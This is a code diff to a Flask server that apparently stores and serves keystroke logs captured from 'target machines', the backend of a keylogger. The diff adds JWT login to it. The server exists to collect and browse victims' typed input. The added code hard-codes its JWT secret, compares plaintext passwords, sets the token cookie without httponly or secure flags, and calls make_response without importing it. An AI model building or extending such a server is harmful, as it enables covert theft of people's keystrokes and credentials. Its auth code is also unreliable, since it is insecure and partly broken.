@@ -1,14 +1,16 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import os, random,string
-import time
+from flask_jwt_extended import create_access_token, get_jwt_identity, jwt_required, JWTManager
+import os, random,string,time, json
 from ToolBox import merge_dicts,decrypt
-import os, json, time
 
 app = Flask(__name__)
-CORS(app)
-DATA_FOLDER = "logs"
+CORS(app,supports_credentials=True)
+app.config['JWT_SECRET_KEY'] = 'q6Nj+unD<gn1*[>J+H!0hO[;rm_Xa'
+jwt = JWTManager(app)
 
+DATA_FOLDER = "logs"
+USERS_PATH = "users.json"
 
 
 
@@ -81,12 +83,14 @@ def check_server():
     return jsonify({"status": "OK"}), 200
 
 @app.route('/api/get_demo',methods = ['GET'])
+@jwt_required()
 def get_demo():
     data = [{"time": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8))), "window": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8))), "text": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8)))} for i in range(random.randint(20,50))]
     return jsonify(data), 200
 
 
 @app.route('/api/get_keystrokes', methods=['GET'])
+@jwt_required()
 def get_keystrokes():
     machine_sn = request.args.get('machine_sn')
 
@@ -109,8 +113,7 @@ def get_keystrokes():
 
         with open(file_path, 'r',encoding='utf-8') as f:
             try:
-
-                list_key_logs = json.load(f)
+                key_logs = json.load(f)
 
             except Exception as e:
                 return jsonify({"error":"logs not found"}),400
@@ -123,9 +126,6 @@ def get_keystrokes():
 
     except Exception as e:
         return jsonify({"error":str(e)}), 500
-
-
-
 
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
@@ -141,6 +141,22 @@ def get_target_machines_list():
         return jsonify(machines), 200
     except Exception as e:
         return jsonify({"error": "server error"}), 500
+
+@app.route('/login', methods=['POST'])
+def login():
+
+    data = request.json
+    username = data.get("username")
+    password = data.get("password")
+    with open(USERS_PATH,'r') as users_file:
+       users = json.load(users_file)
+
+    if username in users and users[username] == password:
+       access_token = create_access_token(identity=username)
+       response = make_response(jsonify({"msg": "Login successful"}))
+       response.set_cookie("access_token",access_token,httponly=False,secure=False)
+       return response
+    return jsonify({"msg": "Invalid credentials"}), 401
 
 
 
